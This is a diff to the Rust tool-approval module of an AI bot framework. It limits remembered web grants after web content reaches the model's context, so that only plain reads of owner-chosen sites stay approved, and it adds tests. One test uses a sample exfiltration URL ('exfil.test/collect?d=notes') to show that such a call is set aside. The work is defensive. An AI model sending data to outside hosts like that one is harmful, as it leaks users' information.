@@ -27,8 +27,10 @@
 //! The document cost check is the grant `(documents, documents.expensive)`.
 //!
 //! Once a round begins with web content in the model's context, standing grants do not cover a
-//! call whose scopes name a web destination ([`web_scoped`]): it asks again. A headless attempt
-//! collects every call of its round that asks into one [`ParkedBatch`] card.
+//! call whose scopes name a web destination ([`web_scoped`]): it asks again. Only a plain read
+//! from a site keeps the owner's grant for that site ([`site_reads_only`]); auto approval and a
+//! tool-wide grant never cover it. A headless attempt collects every call of its round that asks
+//! into one [`ParkedBatch`] card.
 
 use async_trait::async_trait;
 use flow_like_types::bot_message::{
@@ -72,7 +74,7 @@ const CONFIGURATION_TOOLS: [&str; 4] = [
 const WEB_SCOPE_PREFIXES: [&str; 3] = ["web:", "browser:", "owner_browser:"];
 
 /// The `asks_again` reason a live chat's approval prompt carries when [`grant_set_aside`] holds:
-/// the prompt offers no "don't ask again".
+/// auto mode does not waive it, and only a plain site read may be remembered.
 pub const ASKS_AGAIN_WEB_CONTENT: &str = "web_content";
 
 /// One stored `(tool, scope)` pair.
@@ -246,9 +248,19 @@ pub fn web_scoped(tool: &str, args: &Value) -> bool {
 }
 
 /// Whether standing grants are set aside for this call: its round began with web content in the
-/// model's context and it reaches a web destination.
+/// model's context and it reaches a web destination. A call whose scopes are
+/// [`site_reads_only`] still runs on the owner's grant for its site.
 pub fn grant_set_aside(tool: &str, args: &Value) -> bool {
     super::run_recovery::round_has_web_content() && web_scoped(tool, args)
+}
+
+/// Whether every scope is the plain read of a site (`web:<site>:read`), the one web destination
+/// whose grant survives web content: only a site the owner chose can receive the URL.
+pub fn site_reads_only<S: AsRef<str>>(scopes: &[S]) -> bool {
+    !scopes.is_empty()
+        && scopes
+            .iter()
+            .all(|scope| tools::web::is_site_read_scope(scope.as_ref()))
 }
 
 /// What the stores say about one call that asks.
@@ -272,22 +284,30 @@ impl GrantCheck {
     }
 }
 
-/// `auto`: the call is one the auto-approval grant may cover (never a deletion or a setting).
+/// Which standing grants may cover a call.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Coverage {
+    /// Any grant; `auto`: the auto-approval grant too (never a deletion or a setting).
+    Any { auto: bool },
+    /// Only grants for the call's own scopes: a site read after web content.
+    OwnScopes,
+}
+
 fn covering_grants(
     keys: &[GrantKey],
     tool: &str,
     scopes: &[String],
-    auto: bool,
+    coverage: Coverage,
 ) -> Option<Vec<GrantKey>> {
     let auto_grant = GrantKey::new(AUTO_APPROVE_TOOL, SCOPE_ALL);
-    if auto && keys.contains(&auto_grant) {
+    if coverage == (Coverage::Any { auto: true }) && keys.contains(&auto_grant) {
         return Some(vec![auto_grant]);
     }
     let held = |scope: &str| {
         keys.iter()
             .any(|key| key.tool == tool && key.scope == scope)
     };
-    let used: Vec<&str> = if held(SCOPE_ALL) {
+    let used: Vec<&str> = if coverage != Coverage::OwnScopes && held(SCOPE_ALL) {
         vec![SCOPE_ALL]
     } else if scopes.iter().all(|scope| held(scope)) {
         scopes.iter().map(String::as_str).collect()
@@ -315,10 +335,21 @@ async fn match_call(
     }
     let set_aside = grant_set_aside(tool, args);
     let mut keys = None;
-    if !set_aside && let Some(scopes) = grant_scopes(tool, args, context_app) {
+    let grants = grant_scopes(tool, args, context_app).and_then(|scopes| {
+        let coverage = if !set_aside {
+            Coverage::Any {
+                auto: permits_authorization_inference(tool, args),
+            }
+        } else if site_reads_only(&scopes) {
+            Coverage::OwnScopes
+        } else {
+            return None;
+        };
+        Some((scopes, coverage))
+    });
+    if let Some((scopes, coverage)) = grants {
         let listed = store.list().await?;
-        let auto = permits_authorization_inference(tool, args);
-        if let Some(used) = covering_grants(&listed, tool, &scopes, auto) {
+        if let Some(used) = covering_grants(&listed, tool, &scopes, coverage) {
             if use_call {
                 let _ = store.touch(&used).await;
             }
@@ -673,9 +704,15 @@ impl BatchEntry {
     }
 
     fn rememberable(&self) -> bool {
-        !self.after_web_content
+        self.survives_web_content()
             && !self.card.scope.is_empty()
             && !NOT_GRANTABLE.contains(&self.card.tool.as_str())
+    }
+
+    /// An "always" the owner gives now still covers this call after web content.
+    fn survives_web_content(&self) -> bool {
+        !self.after_web_content
+            || site_reads_only(&self.card.scope.split(',').collect::<Vec<_>>())
     }
 
     /// What the call does without its subject: "send a GET request to …".
@@ -728,7 +765,7 @@ fn batch_card(turn_id: &str, entries: &[BatchEntry]) -> Option<ApprovalRequest> 
     if entries.len() == 1 {
         let mut card = first.card.clone();
         if first.calls > 1 || first.after_web_content {
-            if first.after_web_content {
+            if !first.survives_web_content() {
                 card.scope.clear();
             }
             card.items = vec![first.item()];
@@ -1421,6 +1458,110 @@ mod tests {
         assert_eq!(plain, GrantCheck::Granted);
     }
 
+    #[tokio::test]
+    async fn a_site_read_keeps_only_its_own_site_grant_after_web_content() {
+        let store = auto_store();
+        let osv = fetch("https://api.osv.dev/v1/vulns/RUSTSEC-2026-0589");
+        let osv_site = grant_scopes("web_request", &osv, None).unwrap();
+        assert_eq!(osv_site, vec!["web:api.osv.dev:read".to_string()]);
+        store.put("web_request", &osv_site[0]).await.unwrap();
+        store.put("file_save", &osv_site[0]).await.unwrap();
+        let other = fetch("https://exfil.test/collect?d=notes");
+        let write = json!({ "url": "https://api.osv.dev/v1/query", "method": "POST" });
+        let keyed = json!({
+            "url": "https://api.osv.dev/v1/vulns/x",
+            "headers": { "Authorization": "Bearer {{secret:OSV_TOKEN}}" },
+        });
+        let private = json!({ "url": "https://api.osv.dev/v1", "allow_private": true });
+        for args in [&write, &keyed, &private] {
+            for scope in grant_scopes("web_request", args, None).unwrap() {
+                store.put("web_request", &scope).await.unwrap();
+            }
+        }
+        let download = json!({ "url": "https://api.osv.dev/v1/all.zip", "path": "osv.zip" });
+        let marked = |id: &'static str| call_scope(id, true);
+        let check = |tool: &'static str, args: &Value| {
+            let args = args.clone();
+            let store = &store;
+            async move { check_call(store, tool, &args, None).await.unwrap() }
+        };
+
+        assert_eq!(
+            scope_call(marked("c1"), check("web_request", &osv)).await,
+            GrantCheck::Granted
+        );
+        assert_eq!(
+            scope_call(marked("c2"), check("file_save", &download)).await,
+            GrantCheck::Granted
+        );
+        for (id, args) in [("c3", &other), ("c4", &write), ("c5", &keyed), ("c6", &private)] {
+            assert_eq!(
+                scope_call(marked(id), check("web_request", args)).await,
+                GrantCheck::SetAside,
+                "{args}"
+            );
+            assert_eq!(check("web_request", args).await, GrantCheck::Granted, "{args}");
+        }
+
+        store.put("web_request", SCOPE_ALL).await.unwrap();
+        assert_eq!(
+            scope_call(marked("c7"), check("web_request", &other)).await,
+            GrantCheck::SetAside,
+            "a tool-wide grant is not a site the owner chose"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_site_read_asked_after_web_content_offers_always_and_a_write_does_not() {
+        let store = Memory::default();
+        let read = fetch("https://api.github.com/advisories?per_page=20");
+        let read_site = grant_scopes("web_request", &read, None).unwrap().remove(0);
+        let write = json!({ "url": "https://hooks.example/notify", "method": "POST" });
+        let marked = |id: &'static str| call_scope(id, true);
+
+        let alone = ParkedBatch::new("bt_read");
+        let parked = scope_call(
+            marked("c1"),
+            alone.answer(&store, "web_request", &read, None, "Read advisories", None),
+        )
+        .await;
+        assert!(matches!(parked, HeadlessAnswer::Park(_)));
+        let card = alone.card().unwrap();
+        assert_eq!(card.scope, read_site, "old clients may offer Always");
+        assert!(card.items[0].after_web_content);
+        assert_eq!(card.items[0].scope, read_site);
+
+        let mixed = ParkedBatch::new("bt_mixed");
+        for (id, args) in [("c2", &read), ("c3", &write)] {
+            scope_call(
+                marked(id),
+                mixed.answer(&store, "web_request", args, None, "Call", None),
+            )
+            .await;
+        }
+        let card = mixed.card().unwrap();
+        assert_eq!(card.tool, APPROVAL_BATCH_TOOL);
+        assert_eq!(card.scope, "", "the write can't be remembered");
+        assert!(card.items.iter().all(|item| item.after_web_content));
+
+        let answer = ApprovalAnswer {
+            approval_id: alone.card().unwrap().id,
+            decision: ApprovalDecision::Always,
+            items: Vec::new(),
+        };
+        record_batch_answer(&store, &alone.card().unwrap(), &answer)
+            .await
+            .unwrap();
+        let later = fetch("https://api.github.com/advisories?per_page=50");
+        assert_eq!(
+            scope_call(marked("c4"), async {
+                check_call(&store, "web_request", &later, None).await.unwrap()
+            })
+            .await,
+            GrantCheck::Granted
+        );
+    }
+
     fn call_scope(id: &str, round_web_content: bool) -> CallScope {
         CallScope {
             id: id.into(),
@@ -1783,10 +1924,10 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn a_web_grant_is_set_aside_after_web_content() {
+    async fn a_web_write_grant_is_set_aside_after_web_content() {
         let store = Memory::default();
-        let feed = fetch("https://www.cisa.gov/feeds/kev.xml");
-        let site = grant_scopes("web_request", &feed, None).unwrap()[0].clone();
+        let report = json!({ "url": "https://www.cisa.gov/report", "method": "POST" });
+        let site = grant_scopes("web_request", &report, None).unwrap()[0].clone();
         let browse = json!({"url": "https://shop.example/cart"});
         let app = json!({"app_id": "a1", "event_id": "e"});
         store.put("web_request", &site).await.unwrap();
@@ -1799,11 +1940,11 @@ mod tests {
             async move { check_call(store, tool, &args, None).await.unwrap() }
         };
 
-        assert_eq!(check("web_request", &feed).await, GrantCheck::Granted);
-        assert!(!grant_set_aside("web_request", &feed));
+        assert_eq!(check("web_request", &report).await, GrantCheck::Granted);
+        assert!(!grant_set_aside("web_request", &report));
         store.1.lock().unwrap().clear();
         assert_eq!(
-            scope_call(marked("c1"), check("web_request", &feed)).await,
+            scope_call(marked("c1"), check("web_request", &report)).await,
             GrantCheck::SetAside
         );
         assert_eq!(
@@ -1817,7 +1958,7 @@ mod tests {
         );
         assert!(
             scope_call(marked("c1"), async {
-                grant_set_aside("web_request", &feed)
+                grant_set_aside("web_request", &report)
             })
             .await
         );
@@ -1829,36 +1970,36 @@ mod tests {
         );
         assert!(web_scoped("browser_open", &browse) && !web_scoped("call_app_event", &app));
 
-        record_answer(&store, "web_request", &feed, None, ApprovalDecision::Once)
+        record_answer(&store, "web_request", &report, None, ApprovalDecision::Once)
             .await
             .unwrap();
         assert_eq!(
-            scope_call(marked("c1"), check("web_request", &feed)).await,
+            scope_call(marked("c1"), check("web_request", &report)).await,
             GrantCheck::Once
         );
-        record_answer(&store, "web_request", &feed, None, ApprovalDecision::Once)
+        record_answer(&store, "web_request", &report, None, ApprovalDecision::Once)
             .await
             .unwrap();
-        record_answer(&store, "web_request", &feed, None, ApprovalDecision::Deny)
+        record_answer(&store, "web_request", &report, None, ApprovalDecision::Deny)
             .await
             .unwrap();
         assert_eq!(
-            scope_call(marked("c1"), check("web_request", &feed)).await,
+            scope_call(marked("c1"), check("web_request", &report)).await,
             GrantCheck::Denied
         );
         store
             .delete(
                 "web_request",
-                &token(ONCE_PREFIX, "web_request", &feed).scope,
+                &token(ONCE_PREFIX, "web_request", &report).scope,
             )
             .await
             .unwrap();
 
         let batch = ParkedBatch::new("bt_1");
-        let description = "The bot wants to send a GET request to cisa.gov/feeds/kev.xml.";
+        let description = "The bot wants to send a POST request to cisa.gov/report.";
         let parked = scope_call(
             marked("c2"),
-            batch.answer(&store, "web_request", &feed, None, description, None),
+            batch.answer(&store, "web_request", &report, None, description, None),
         )
         .await;
         assert!(matches!(parked, HeadlessAnswer::Park(_)));
@@ -1869,7 +2010,7 @@ mod tests {
         );
         assert_eq!(
             card.id,
-            approval_message_id("bt_1", &args_hash("web_request", &feed))
+            approval_message_id("bt_1", &args_hash("web_request", &report))
         );
         assert_eq!(card.items.len(), 1);
         assert!(card.items[0].after_web_content);
@@ -1888,7 +2029,7 @@ mod tests {
             batch.answer(
                 &store,
                 "web_request",
-                &feed,
+                &report,
                 None,
                 description,
                 Some(&inference),
